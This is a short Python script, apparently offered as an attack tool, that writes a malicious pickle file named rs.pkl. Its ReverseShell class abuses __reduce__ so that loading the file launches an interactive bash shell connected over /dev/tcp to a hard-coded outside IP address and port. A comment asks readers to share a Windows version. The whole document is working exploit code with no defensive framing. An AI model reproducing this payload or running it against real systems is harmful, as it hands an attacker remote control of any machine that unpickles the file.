import pickle

class ReverseShell(object):

    def __init__(self, bash_cmd):
        self.bash_cmd = bash_cmd

    def __reduce__(self):
        import os
        import subprocess
        if os.name == 'posix':
            return (subprocess.Popen, (self.bash_cmd, -1, None, None, None, None, None, None, True))
        # making this work for windows seems much harder 
        # please do share if you know how this can be done
        elif os.name == 'nt':
            return None

if __name__ == '__main__':
    host = '52.207.225.255'
    port = 6006
    bash_cmd = 'bash -i >& /dev/tcp/{}/{} 0>&1'.format(host, port)
    rs = ReverseShell(bash_cmd)
    with open('rs.pkl', 'wb') as f:
        pickle.dump(rs, f)
